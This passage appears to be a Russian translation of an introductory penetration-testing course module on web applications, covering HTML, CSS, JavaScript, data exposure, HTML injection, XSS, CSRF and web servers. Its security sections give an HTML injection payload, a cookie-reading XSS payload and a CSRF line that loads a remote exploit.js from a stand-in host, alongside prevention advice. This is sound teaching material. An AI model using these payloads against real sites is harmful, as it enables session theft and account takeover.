| `5.` | Неправильная конфигурация безопасности |
| `6.` | Уязвимые и устаревшие компоненты |
| `7.` | Сбои идентификации и аутентификации |
| `8.` | Сбои целостности программного обеспечения и данных |
| `9.` | Сбои логирования и мониторинга безопасности |
| `10.` | Подделка запросов на стороне сервера (SSRF) |

Важно начать знакомиться с этими недостатками и уязвимостями, поскольку они формируют основу для многих проблем, которые мы рассматриваем в будущих веб- и даже не веб-связанных модулях. Как тестировщики на проникновение, мы должны иметь способность компетентно идентифицировать, эксплуатировать и объяснять эти уязвимости для наших клиентов.






# 1.4 HTML

---

Первый и наиболее доминирующий компонент фронтенда веб-приложений — это [HTML (HyperText Markup Language)](https://en.wikipedia.org/wiki/HTML). HTML находится в самом ядре любой веб-страницы, которую мы видим в интернете. Он содержит основные элементы каждой страницы, включая заголовки, формы, изображения и многие другие элементы. Веб-браузер, в свою очередь, интерпретирует эти элементы и отображает их конечному пользователю.

Ниже приведен очень простой пример HTML-страницы:

#### Пример

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```

Это будет отображаться следующим образом:

![Browser window with page title 'Page Title', URL 'www.example.coml', heading 'A Heading', and paragraph 'A Paragraph'.](https://academy.hackthebox.com/storage/modules/75/web_apps_html_2.jpg)

Как мы можем видеть, HTML-элементы отображаются в древовидной форме, аналогично `XML` и другим языкам:

#### Структура HTML

```
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```

Каждый элемент может содержать другие HTML-элементы, в то время как основной тег `HTML` должен содержать все остальные элементы на странице, которые находятся под `document`, различая между `HTML` и документами, написанными для других языков, таких как `XML` документы.

HTML-элементы приведенного выше кода можно рассматривать следующим образом:

**&lt;html&gt;**
- **&lt;head&gt;**
  - **&lt;title&gt;Page Title&lt;/title&gt;**
- **&lt;/head&gt;**
- **&lt;body&gt;**
  - **&lt;h1&gt;A Heading&lt;/h1&gt;**
  - **&lt;p&gt;A Paragraph&lt;/p&gt;**
- **&lt;/body&gt;**

**&lt;/html&gt;**

Каждый HTML-элемент открывается и закрывается тегом, который указывает тип элемента (например, `<p>` для абзацев), где содержимое будет размещено между этими тегами. Теги также могут содержать id или класс элемента (например, `<p id='para1'>` или `<p id='red-paragraphs'>`), который необходим для CSS для правильного форматирования элемента. И теги, и содержимое составляют весь элемент.

---

## URL-кодирование

Важной концепцией для изучения в HTML является [URL-кодирование](https://en.wikipedia.org/wiki/Percent-encoding) или процентное кодирование. Для правильного отображения содержимого страницы браузер должен знать используемую кодировку. В URL-адресах, например, браузеры могут использовать только [ASCII](https://en.wikipedia.org/wiki/ASCII) кодировку, которая позволяет только буквенно-цифровые символы и определенные специальные символы. Поэтому все остальные символы вне набора символов ASCII должны быть закодированы в URL. URL-кодирование заменяет небезопасные ASCII-символы символом `%`, за которым следуют две шестнадцатеричные цифры.

Например, символ одинарной кавычки '`'`' кодируется как '`%27`', что может быть понято браузерами как одинарная кавычка. URL-адреса не могут содержать пробелы и заменят пробел либо знаком `+` (плюс), либо `%20`. Некоторые распространенные кодировки символов:

| Символ | Кодировка |
|---------|----------|
| пробел  | %20      |
| !       | %21      |
| "       | %22      |
| #       | %23      |
| $       | %24      |
| %       | %25      |
| &       | %26      |
| '       | %27      |
| (       | %28      |
| )       | %29      |

Полную таблицу кодировки символов можно посмотреть [здесь](https://www.w3schools.com/tags/ref_urlencode.ASP).

Множество онлайн-инструментов можно использовать для выполнения URL-кодирования/декодирования. Кроме того, популярный веб-прокси [Burp Suite](https://portswigger.net/burp) имеет декодер/кодер, который можно использовать для преобразования между различными типами кодировок. Попробуйте кодировать/декодировать некоторые символы и строки, используя этот [онлайн-инструмент](https://www.url-encode-decode.com/).

#### Использование

Элемент `<head>` обычно содержит элементы, которые не печатаются непосредственно на странице, такие как заголовок страницы, в то время как все основные элементы страницы расположены под `<body>`. Другие важные элементы включают `<style>`, который содержит CSS-код страницы, и `<script>`, который содержит JS-код страницы, как мы увидим в следующем разделе.

Каждый из этих элементов называется [DOM (Document Object Model)](https://en.wikipedia.org/wiki/Document_Object_Model). [Консорциум World Wide Web (W3C)](https://www.w3.org/) определяет `DOM` как:

`"W3C Document Object Model (DOM) — это платформо- и языково-нейтральный интерфейс, который позволяет программам и скриптам динамически получать доступ и обновлять содержимое, структуру и стиль документа."`

Стандарт DOM разделен на 3 части:

- `Core DOM` — стандартная модель для всех типов документов
- `XML DOM` — стандартная модель для XML-документов
- `HTML DOM` — стандартная модель для HTML-документов

Например, из приведенного выше древовидного представления мы можем ссылаться на DOM как `document.head` или `document.h1` и так далее.

Понимание структуры HTML DOM может помочь нам понять, где расположен каждый элемент, который мы видим на странице, что позволяет нам просматривать исходный код конкретного элемента на странице и искать потенциальные проблемы. Мы можем находить HTML-элементы по их id, имени тега или имени класса.

Это также полезно, когда мы хотим использовать уязвимости фронтенда (такие как `XSS`) для манипулирования существующими элементами или создания новых элементов для удовлетворения наших потребностей.

---

## Вопросы

**Какой HTML-тег используется для отображения изображения?**

*Подсказка: Google — ваш друг. Укажите только открывающий тег (т.е. <...>)*









# 1.5 Каскадные таблицы стилей (CSS)

---

[CSS (Cascading Style Sheets)](https://www.w3.org/Style/CSS/Overview.en.html) — это язык таблиц стилей, используемый вместе с HTML для форматирования и задания стиля элементов HTML. Как и HTML, существует несколько версий CSS, и каждая последующая версия вводит новый набор возможностей, которые можно использовать для форматирования элементов HTML. Браузеры обновляются вместе с ним для поддержки этих новых функций.

---

#### Пример

На фундаментальном уровне CSS используется для определения стиля каждого класса или типа элементов HTML (например, `body` или `h1`), таким образом, чтобы любой элемент на этой странице был представлен в соответствии с определением в файле CSS. Это может включать семейство шрифтов, размер шрифта, цвет фона, цвет текста и выравнивание, и многое другое.

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```

Как упоминалось ранее, именно поэтому мы можем устанавливать уникальные идентификаторы или имена классов для определенных элементов HTML, чтобы позже ссылаться на них в CSS или JavaScript при необходимости.

---

## Синтаксис

CSS определяет стиль каждого элемента HTML или класса между фигурными скобками `{}`, внутри которых свойства определяются со своими значениями (т.е. `element { property : value; }`).

Каждый элемент HTML имеет множество свойств, которые можно задать через CSS, такие как `height`, `position`, `border`, `margin`, `padding`, `color`, `text-align`, `font-size` и сотни других свойств. Все они могут быть объединены и использованы для создания визуально привлекательных веб-страниц.

CSS может использоваться для продвинутых анимаций для широкого спектра применений, от перемещения элементов до продвинутых 3D анимаций. Множество свойств CSS доступны для анимаций, таких как `@keyframes`, `animation`, `animation-duration`, `animation-direction` и многие другие. Вы можете прочитать о многих из этих свойств анимации и попробовать их [здесь](https://www.w3schools.com/css/css3_animations.asp).

---

#### Использование

CSS часто используется вместе с JavaScript для быстрых вычислений, динамической настройки свойств стиля определенных элементов HTML или достижения продвинутых анимаций на основе нажатий клавиш или положения курсора мыши.

Следующий пример прекрасно иллюстрирует такие возможности CSS при использовании с HTML и JavaScript "Parallax Depth Cards - by Andy Merskin on [CodePen](https://codepen.io/)":

![Пример анимации](https://academy.hackthebox.com/storage/modules/75/parallax_example.png)

> Вы можете нажать на вкладки в верхнем левом углу, чтобы просмотреть исходный код.

Это показывает, что даже несмотря на то, что HTML и CSS являются одними из самых основных краеугольных камней веб-разработки, при правильном использовании они могут использоваться для создания визуально потрясающих веб-страниц, которые могут сделать взаимодействие с веб-приложениями намного проще и удобнее для пользователя.

Кроме того, CSS может использоваться вместе с другими языками для реализации их стилей, например `XML` или внутри элементов `SVG`, а также может использоваться в современных платформах мобильной разработки для создания полных пользовательских интерфейсов (UI) мобильных приложений.

---

## Фреймворки

Многие могут считать CSS сложным для разработки. В то же время другие могут утверждать, что неэффективно вручную устанавливать стиль и дизайн всех элементов HTML на каждой веб-странице. Именно поэтому были введены многие CSS фреймворки, которые содержат коллекцию CSS таблиц стилей и дизайнов, чтобы сделать создание красивых элементов HTML намного быстрее и проще.

Кроме того, эти фреймворки оптимизированы для использования веб-приложений. Они созданы для использования с JavaScript и для широкого применения внутри веб-приложения и содержат элементы, обычно требуемые в современных веб-приложениях. Некоторые из наиболее распространенных CSS фреймворков:

- [Bootstrap](https://www.w3schools.com/bootstrap4/)
- [SASS](https://sass-lang.com/)
- [Foundation](https://en.wikipedia.org/wiki/Foundation_(framework))
- [Bulma](https://bulma.io/)
- [Pure](https://purecss.io/)

## Вопросы

**+ 1 🟢** Какое CSS "свойство: значение" используется для выравнивания текста HTML элемента по левому краю?

*Подсказка: Не забудьте точку с запятой ';'*








# 1.5 JavaScript

---

[JavaScript](https://en.wikipedia.org/wiki/JavaScript) — один из самых используемых языков в мире. Он в основном используется для веб-разработки и мобильной разработки. `JavaScript` обычно используется на фронтенде приложения для выполнения в браузере. Тем не менее, существуют реализации серверного JavaScript, используемые для разработки полных веб-приложений, например [NodeJS](https://nodejs.org/en/about/).

Хотя `HTML` и `CSS` в основном отвечают за то, как выглядит веб-страница, `JavaScript` обычно используется для управления любой функциональностью, которая требуется фронтенд веб-странице. Без `JavaScript` веб-страница была бы в основном статичной и не имела бы большой функциональности или интерактивных элементов.

---

#### Пример

В исходном коде страницы код `JavaScript` загружается с помощью тега `<script>` следующим образом:

```html
<script type="text/javascript">
..JavaScript код..
</script>
```

Веб-страница также может загружать удаленный код `JavaScript` с помощью `src` и ссылки на скрипт следующим образом:

```html
<script src="./script.js"></script>
```

Пример базового использования `JavaScript` на веб-странице выглядит следующим образом:

```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```

Приведенный выше пример изменяет содержимое HTML-элемента `button1`. Отсюда существует множество более продвинутых способов использования `JavaScript` на веб-странице. Ниже показан пример того, что приведенный выше код `JavaScript` будет делать при привязке к клику кнопки:

<button onclick="document.getElementById('button1').innerHTML = 'Changed Text!';" id="button1">Original Text</button>

Как и в случае с HTML, в интернете доступно множество сайтов для экспериментов с `JavaScript`. Одним из примеров является [JSFiddle](https://jsfiddle.net/), который можно использовать для тестирования `JavaScript`, `CSS` и `HTML` и сохранения фрагментов кода. `JavaScript` — продвинутый язык, и его синтаксис не так прост, как у `HTML` или `CSS`.

---

## Использование

Большинство распространенных веб-приложений в значительной степени полагаются на `JavaScript` для обеспечения всей необходимой функциональности на веб-странице, такой как обновление представления веб-страницы в реальном времени, динамическое обновление контента в реальном времени, принятие и обработка пользовательского ввода, и многие другие потенциальные функциональности.

`JavaScript` также используется для автоматизации сложных процессов и выполнения HTTP-запросов для взаимодействия с серверными компонентами и отправки и получения данных через такие технологии, как [Ajax](https://en.wikipedia.org/wiki/Ajax_(programming)).

В дополнение к автоматизации, `JavaScript` также часто используется вместе с `CSS`, как упоминалось ранее, для создания продвинутых анимаций, которые были бы невозможны только с `CSS`. Всякий раз, когда мы посещаем интерактивную и динамичную веб-страницу, которая использует множество продвинутых и визуально привлекательных анимаций, мы видим результат активного кода `JavaScript`, работающего в нашем браузере.

Все современные веб-браузеры оснащены движками `JavaScript`, которые могут выполнять код `JavaScript` на стороне клиента без зависимости от серверной части веб-сервера для обновления страницы. Это делает использование `JavaScript` очень быстрым способом достижения большого количества процессов быстро.

---

## Фреймворки

По мере того как веб-приложения становятся более продвинутыми, может быть неэффективно использовать чистый `JavaScript` для разработки всего веб-приложения с нуля. Именно поэтому был представлен ряд фреймворков `JavaScript` для улучшения опыта разработки веб-приложений.

Эти платформы представляют библиотеки, которые делают очень простым воссоздание продвинутых функциональностей, таких как вход пользователя в систему и регистрация пользователя, и они представляют новые технологии, основанные на существующих, например использование динамически изменяющегося кода `HTML` вместо использования статического кода `HTML`.

Эти платформы либо используют `JavaScript` в качестве языка программирования, либо используют реализацию `JavaScript`, которая компилирует свой код в код `JavaScript`.

Некоторые из наиболее распространенных фронтенд фреймворков `JavaScript`:

- [Angular](https://www.w3schools.com/angular/angular_intro.asp)
- [React](https://www.w3schools.com/react/react_intro.asp)
- [Vue](https://www.w3schools.com/whatis/whatis_vue.asp)
- [jQuery](https://www.w3schools.com/jquery/)

Список и сравнение распространенных JavaScript фреймворков можно найти [здесь](https://en.wikipedia.org/wiki/Comparison_of_JavaScript_frameworks).








# 1.6 Раскрытие конфиденциальных данных

---

Все компоненты `front end`, которые мы рассмотрели, взаимодействуют на стороне клиента. Поэтому, если они подвергаются атаке, они не представляют прямой угрозы для основного `back end` веб-приложения и обычно не приводят к необратимому ущербу. Однако, поскольку эти компоненты выполняются на `стороне клиента`, они подвергают конечного пользователя опасности быть атакованным и эксплуатированным, если в них есть какие-либо уязвимости. Если уязвимость front end используется для атаки на администраторов, это может привести к несанкционированному доступу, доступу к конфиденциальным данным, нарушению работы сервиса и многому другому.

Хотя большинство тестов на проникновение веб-приложений сосредоточено на компонентах back end и их функциональности, важно также тестировать компоненты front end на наличие потенциальных уязвимостей, поскольку эти типы уязвимостей иногда могут использоваться для получения доступа к конфиденциальной функциональности (например, панель администратора), что может привести к компрометации всего сервера.

[Раскрытие конфиденциальных данных](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) относится к доступности конфиденциальных данных в открытом виде для конечного пользователя. Обычно это находится в `исходном коде` веб-страницы или исходном коде страницы на front end веб-приложений. Это HTML исходный код приложения, который не следует путать с back end кодом, который обычно доступен только на самом сервере. Мы можем просмотреть исходный код любого веб-сайта в нашем браузере, щелкнув правой кнопкой мыши в любом месте страницы и выбрав `Просмотр исходного кода страницы` из всплывающего меню. Иногда разработчик может отключить щелчок правой кнопкой мыши в веб-приложении, но это не мешает нам просматривать исходный код страницы, поскольку мы можем просто набрать `ctrl + u` или просмотреть исходный код страницы через веб-прокси, такой как `Burp Suite`. Давайте посмотрим на исходный код страницы google.com. Щелкните правой кнопкой мыши и выберите `Просмотр исходного кода страницы`, и в вашем браузере откроется новая вкладка с URL `view-source:https://www.google.com/`. Здесь мы можем увидеть `HTML`, `JavaScript` и внешние ссылки. Потратьте немного времени на просмотр исходного кода страницы.

![Screenshot of HTML and JavaScript code in a text editor.](https://academy.hackthebox.com/storage/modules/75/view_source1.png)

Иногда мы можем найти учетные данные для входа `credentials`, `хеши` или другие конфиденциальные данные, скрытые в комментариях исходного кода веб-страницы или во внешнем `JavaScript` коде, который импортируется. Другая конфиденциальная информация может включать открытые ссылки или каталоги или даже открытую информацию о пользователях, все это потенциально может быть использовано для расширения нашего доступа к веб-приложению или даже к поддерживающей инфраструктуре веб-приложения (веб-сервер, сервер базы данных и т.д.).

По этой причине одной из первых вещей, которые мы должны делать при оценке веб-приложения, является просмотр его исходного кода страницы, чтобы увидеть, можем ли мы идентифицировать какие-либо "легкие цели", такие как открытые учетные данные или скрытые ссылки.

---

#### Пример

На первый взгляд эта форма входа не выглядит как что-то необычное:

![Login form with fields for username and password, and a login button.](https://academy.hackthebox.com/storage/modules/75/web_apps_login_form_.png)

Давайте посмотрим на исходный код страницы:

**Код: html**
```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```

Мы видим, что разработчики добавили некоторые комментарии, которые забыли удалить, и которые содержат тестовые учетные данные:

**Код: html**
```html
<!-- TODO: remove test credentials test:test -->
```

Комментарий, похоже, является напоминанием для разработчиков удалить тестовые учетные данные. Учитывая, что комментарий еще не был удален, эти учетные данные могут все еще быть действительными.

Хотя не очень часто находят учетные данные для входа в комментариях разработчиков, мы все еще можем найти различные биты конфиденциальной и ценной информации при просмотре исходного кода, такие как тестовые страницы или каталоги, параметры отладки или скрытую функциональность. Существуют различные автоматизированные инструменты, которые мы можем использовать для сканирования и анализа доступного исходного кода страницы для идентификации потенциальных путей или каталогов и другой конфиденциальной информации.

Использование этих типов информации может дать нам дальнейший доступ к веб-приложению, что может помочь нам атаковать компоненты back end для получения контроля над сервером.

---

## Предотвращение

В идеале исходный код front end должен содержать только код, необходимый для запуска всех функций веб-приложений, без какого-либо дополнительного кода или комментариев, которые не нужны для правильного функционирования веб-приложения. Всегда важно просматривать код, который будет виден конечным пользователям через исходный код страницы, или прогонять его через инструменты для проверки на открытую информацию.

Также важно классифицировать типы данных в исходном коде и применять контроль над тем, что может или не может быть открыто на стороне клиента. Разработчики также должны просматривать код на стороне клиента, чтобы убедиться, что не остались ненужные комментарии или скрытые ссылки. Кроме того, разработчики front end могут захотеть использовать упаковку или обфускацию `JavaScript` кода для снижения вероятности раскрытия конфиденциальных данных через `JavaScript код`. Эти методы могут предотвратить автоматизированные инструменты от обнаружения этих типов данных.








# 1.7 HTML-инъекция

---

Еще одним важным аспектом безопасности фронтенда является проверка и очистка принимаемого пользовательского ввода. Во многих случаях проверка и очистка пользовательского ввода выполняется на бэкенде. Однако некоторый пользовательский ввод в некоторых случаях никогда не попадает на бэкенд и полностью обрабатывается и отображается на фронтенде. Поэтому критически важно проверять и очищать пользовательский ввод как на фронтенде, так и на бэкенде.

[HTML-инъекция](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) происходит, когда нефильтрованный пользовательский ввод отображается на странице. Это может происходить либо через получение ранее отправленного кода, например, получение комментария пользователя из базы данных бэкенда, либо путем прямого отображения нефильтрованного пользовательского ввода через `JavaScript` на фронтенде.

Когда пользователь имеет полный контроль над тем, как будет отображаться его ввод, он может отправить `HTML`-код, и браузер может отобразить его как часть страницы. Это может включать вредоносный `HTML`-код, например, внешнюю форму входа, которая может использоваться для обмана пользователей, заставляя их войти в систему, фактически отправляя свои учетные данные на вредоносный сервер для сбора и использования в других атаках.

Другим примером `HTML-инъекции` является порча веб-страниц. Это состоит во внедрении нового `HTML`-кода для изменения внешнего вида веб-страницы, вставки вредоносной рекламы или даже полного изменения страницы. Этот тип атаки может привести к серьезному ущербу репутации компании, размещающей веб-приложение.

---

## Пример

Следующий пример представляет собой очень простую веб-страницу с одной кнопкой "`Нажмите, чтобы ввести ваше имя`". Когда мы нажимаем на кнопку, она предлагает нам ввести наше имя, а затем отображает наше имя как "`Ваше имя ...`":

![Кнопка с надписью 'Нажмите, чтобы ввести ваше имя' и текст 'Ваше имя пользователь'.](https://academy.hackthebox.com/storage/modules/75/web_apps_html_injection_5.jpg)

Если очистка ввода не применяется, это потенциально легкая цель для атак `HTML-инъекции` и `межсайтового скриптинга (XSS)`. Мы смотрим на исходный код страницы и видим, что очистка ввода вообще не применяется, поскольку страница принимает пользовательский ввод и напрямую отображает его:

```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```

Для тестирования `HTML-инъекции` мы можем просто ввести небольшой фрагмент `HTML`-кода в качестве нашего имени и посмотреть, отображается ли он как часть страницы. Мы протестируем следующий код, который изменяет фоновое изображение веб-страницы:

```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

После того, как мы введем его, мы увидим, что фоновое изображение веб-страницы мгновенно изменится:

![Кнопка с надписью 'Нажмите, чтобы ввести ваше имя' и текст 'Ваше имя' рядом с логотипом 'ACADEMY'.](https://academy.hackthebox.com/storage/modules/75/web_apps_html_injection_6.jpg)

> **Примечание:** В этом примере, поскольку все выполняется на фронтенде, обновление веб-страницы сбросит все обратно к нормальному состоянию.








# 1.8 Межсайтовый скриптинг (XSS)

---

Уязвимости `HTML-инъекций` часто могут быть использованы для выполнения атак [межсайтового скриптинга (XSS)](https://owasp.org/www-community/attacks/xss/) путем внедрения `JavaScript`-кода для выполнения на стороне клиента. Как только мы можем выполнить код на машине жертвы, мы потенциально можем получить доступ к учетной записи жертвы или даже к ее машине. `XSS` очень похож на `HTML-инъекцию` на практике. Однако `XSS` включает в себя внедрение `JavaScript`-кода для выполнения более продвинутых атак на стороне клиента, вместо простого внедрения HTML-кода. Существует три основных типа `XSS`:

| Тип | Описание |
|-----|----------|
| `Reflected XSS` | Происходит, когда пользовательский ввод отображается на странице после обработки (например, результат поиска или сообщение об ошибке). |
| `Stored XSS` | Происходит, когда пользовательский ввод сохраняется в базе данных бэкенда, а затем отображается при извлечении (например, сообщения или комментарии). |
| `DOM XSS` | Происходит, когда пользовательский ввод напрямую отображается в браузере и записывается в объект `HTML` DOM (например, уязвимое имя пользователя или заголовок страницы). |

В примере, который мы видели для `HTML-инъекции`, не было никакой санитизации ввода. Поэтому возможно, что та же страница может быть уязвима для атак `XSS`. Мы можем попробовать внедрить следующий `DOM XSS` `JavaScript`-код в качестве полезной нагрузки, который должен показать нам значение cookie для текущего пользователя:

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

После того, как мы введем нашу полезную нагрузку и нажмем `ok`, мы увидим, что появляется окно предупреждения со значением cookie в нем:

![Диалоговое окно, отображающее значение cookie и кнопку 'Закрыть'.](https://academy.hackthebox.com/storage/modules/75/web_apps_xss_2.jpg)

Эта полезная нагрузка обращается к дереву документа `HTML` и извлекает значение объекта `cookie`. Когда браузер обрабатывает наш ввод, он будет рассматриваться как новый `DOM`, и наш `JavaScript` будет выполнен, отображая значение cookie обратно нам во всплывающем окне.

Злоумышленник может использовать это для кражи сеансов cookie и отправки их себе, а затем попытаться использовать значение cookie для аутентификации в учетной записи жертвы. Та же атака может быть использована для выполнения различных типов других атак против пользователей веб-приложения. `XSS` является обширной темой, которая будет подробно рассмотрена в последующих модулях.








# 1.9 Подделка межсайтовых запросов (CSRF)

---

Третий тип уязвимости фронтенда, вызванный нефильтрованным пользовательским вводом, - это [Подделка межсайтовых запросов (CSRF)](https://owasp.org/www-community/attacks/csrf). Атаки `CSRF` могут использовать уязвимости `XSS` для выполнения определённых запросов и вызовов `API` в веб-приложении, к которому жертва в данный момент аутентифицирована. Это позволило бы атакующему выполнять действия от имени аутентифицированного пользователя. Они также могут использовать другие уязвимости для выполнения тех же функций, например, использование HTTP-параметров для атак.

Распространённая атака `CSRF` для получения привилегированного доступа к веб-приложению - это создание полезной нагрузки `JavaScript`, которая автоматически изменяет пароль жертвы на значение, установленное атакующим. Как только жертва просматривает полезную нагрузку на уязвимой странице (например, вредоносный комментарий, содержащий полезную нагрузку `JavaScript` `CSRF`), код `JavaScript` выполняется автоматически. Он использует зарегистрированную сессию жертвы для изменения её пароля. После этого атакующий может войти в учётную запись жертвы и контролировать её.

`CSRF` также может быть использован для атаки на администраторов и получения доступа к их учётным записям. Администраторы обычно имеют доступ к чувствительным функциям, которые иногда могут быть использованы для атаки и получения контроля над серверной частью (в зависимости от функциональности, предоставляемой администраторам в данном веб-приложении). Следуя этому примеру, вместо использования кода `JavaScript`, который возвращает cookie сессии, мы загрузили бы удалённый файл `.js` (`JavaScript`), как показано ниже:

```html
"><script src=//www.example.com/exploit.js></script>
```

Файл `exploit.js` содержал бы вредоносный код `JavaScript`, который изменяет пароль пользователя. Разработка `exploit.js` в данном случае требует знания процедуры изменения пароля этого веб-приложения и `API`. Атакующему необходимо создать код `JavaScript`, который реплицирует желаемую функциональность и автоматически выполняет её (то есть код `JavaScript`, который изменяет наш пароль для этого конкретного веб-приложения).

---

## Предотвращение

Хотя на серверной части должны быть меры для обнаружения и фильтрации пользовательского ввода, также всегда важно фильтровать и очищать пользовательский ввод на фронтенде, прежде чем он достигнет серверной части, особенно если этот код может отображаться непосредственно на клиентской стороне без связи с серверной частью. При приёме пользовательского ввода должны применяться два основных контроля:

| Тип | Описание |
|-----|----------|
| `Очистка` | Удаление специальных символов и нестандартных символов из пользовательского ввода перед его отображением или сохранением. |
| `Валидация` | Обеспечение того, чтобы отправленный пользовательский ввод соответствовал ожидаемому формату (то есть отправленный email соответствовал формату email) |

Кроме того, также важно очищать отображаемый вывод и удалять любые специальные/нестандартные символы. В случае, если атакующему удастся обойти фильтры очистки и валидации на фронтенде и серверной части, это всё равно не причинит вреда на фронтенде.

После того как мы очистим и/или проверим пользовательский ввод и отображаемый вывод, мы сможем предотвратить атаки типа `HTML Injection` и `XSS`. Другим решением было бы внедрение [брандмауэра веб-приложений (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), который может помочь автоматически предотвращать попытки инъекций. Однако следует отметить, что решения WAF потенциально могут быть обойдены, поэтому разработчики должны следовать лучшим практикам кодирования и не полагаться исключительно на устройство для обнаружения/блокировки атак.

Для защиты от `XSS` современные браузеры имеют встроенную защиту, которая блокирует автоматическое выполнение Javascript-кода. В случае `CSRF` большинство современных веб-приложений включают механизмы защиты от CSRF, такие как требование уникального токена для каждой сессии или запроса. Кроме того, защита на уровне HTTP, такая как атрибут cookie `SameSite` (`SameSite=Strict` или `Lax`), может ограничить браузеры от включения cookie аутентификации в межсайтовые запросы. Функциональная защита, такая как требование ввода пароля пользователем перед его изменением, также может помочь смягчить воздействие CSRF. Несмотря на эти меры безопасности, они всё ещё могут быть обойдены в определённых сценариях. В результате уязвимости типа XSS и CSRF продолжают представлять значительные риски для пользователей веб-приложений. Эти средства защиты следует рассматривать как дополнительные уровни защиты, а не как основные меры безопасности - разработчики должны обеспечить безопасность своих приложений по дизайну и отсутствие присущих им уязвимостей к таким атакам.

Данная [памятка по предотвращению подделки межсайтовых запросов](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) от OWASP обсуждает атаку и меры предотвращения более подробно.








# 2.1 Back End серверы

---

Back-end сервер - это аппаратное обеспечение и операционная система на серверной стороне, которая размещает все приложения, необходимые для работы веб-приложения. Это реальная система, выполняющая все процессы и задачи, которые составляют всё веб-приложение. Back-end сервер относится к [уровню доступа к данным](https://en.wikipedia.org/wiki/Data_access_layer).

---

## Программное обеспечение

Back-end сервер содержит другие 3 компонента серверной части:

- `Веб-сервер`
- `База данных`
- `Фреймворк разработки`

![Диаграмма, показывающая back-end сервер с Linux и Windows, подключенный к веб-серверу (Apache, NGINX, IIS), веб-приложению (PHP, C#, Java) и базе данных (MySQL, MS SQL, Oracle).](https://academy.hackthebox.com/storage/modules/75/backend-server.jpg)

Другие программные компоненты на back-end сервере могут включать [гипервизоры](https://en.wikipedia.org/wiki/Hypervisor), контейнеры и WAF.

Существует множество популярных комбинаций "стеков" для back-end серверов, которые содержат определенный набор серверных компонентов. Некоторые распространенные примеры включают:

| Комбинации | Компоненты |
|------------|------------|
| [LAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)) | `Linux`, `Apache`, `MySQL` и `PHP`. |
| [WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP) | `Windows`, `Apache`, `MySQL` и `PHP`. |
| [WINS](https://en.wikipedia.org/wiki/Solution_stack) | `Windows`, `IIS`, `.NET` и `SQL Server` |
| [MAMP](https://en.wikipedia.org/wiki/MAMP) | `macOS`, `Apache`, `MySQL` и `PHP`. |
| [XAMPP](https://en.wikipedia.org/wiki/XAMPP) | Кроссплатформенный, `Apache`, `MySQL` и `PHP/PERL`. |

Мы можем найти исчерпывающий список стеков веб-решений в этой [статье](https://en.wikipedia.org/wiki/Solution_stack).

---

## Аппаратное обеспечение

Back-end сервер содержит всё необходимое аппаратное обеспечение. Мощность и производительность этого оборудования определяют, насколько стабильным и отзывчивым будет веб-приложение. Как ранее обсуждалось в разделе `Архитектура`, многие архитектуры, особенно для крупных веб-приложений, спроектированы для распределения нагрузки на множество back-end серверов, которые коллективно работают вместе для выполнения одних и тех же задач и доставки веб-приложения конечному пользователю. Веб-приложения не обязательно должны работать непосредственно на одном back-end сервере, но могут использовать центры обработки данных и облачные хостинг-сервисы, которые предоставляют виртуальные хосты для веб-приложения.







# 2.2 Веб-серверы

**[Веб-сервер](https://en.wikipedia.org/wiki/Web_server)** — это приложение, которое работает на серверной части (back end), обрабатывает весь HTTP-трафик от клиентского браузера, направляет его на запрашиваемые страницы и, наконец, отвечает клиентскому браузеру. Веб-серверы обычно работают на TCP **[портах](https://en.wikipedia.org/wiki/Port_(computer_networking))** `80` или `443` и отвечают за подключение конечных пользователей к различным частям веб-приложения, а также за обработку их различных ответов.

---

## Рабочий процесс

Типичный веб-сервер принимает HTTP-запросы от клиентской стороны и отвечает различными HTTP-ответами и кодами, такими как код `200 OK` для успешного запроса, код `404 NOT FOUND` при запросе несуществующих страниц, код `403 FORBIDDEN` для запроса доступа к ограниченным страницам и так далее.

![Диаграмма, показывающая веб-сервер, обрабатывающий запросы и ответы от трех клиентов: смартфона, ноутбука и монитора.](https://academy.hackthebox.com/storage/modules/75/web-server-requests.jpg)

Ниже приведены некоторые из наиболее распространенных **[кодов HTTP-ответов](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)**:

| Код | Описание |
|-----|----------|
| **Успешные ответы** | |
| `200 OK` | Запрос выполнен успешно |
| **Сообщения перенаправления** | |
| `301 Moved Permanently` | URL запрашиваемого ресурса был изменен навсегда |
| `302 Found` | URL запрашиваемого ресурса был изменен временно |
| **Ошибки клиента** | |
| `400 Bad Request` | Сервер не смог понять запрос из-за неверного синтаксиса |
| `401 Unauthorized` | Неаутентифицированная попытка доступа к странице |
| `403 Forbidden` | У клиента нет прав доступа к содержимому |
| `404 Not Found` | Сервер не может найти запрашиваемый ресурс |
| `405 Method Not Allowed` | Метод запроса известен серверу, но отключен и не может быть использован |
| `408 Request Timeout` | Этот ответ отправляется на неактивное соединение некоторыми серверами, даже без предварительного запроса от клиента |
| **Ошибки сервера** | |
| `500 Internal Server Error` | Сервер столкнулся с ситуацией, которую не знает, как обработать |
| `502 Bad Gateway` | Сервер, работая как шлюз для получения ответа, необходимого для обработки запроса, получил недействительный ответ |
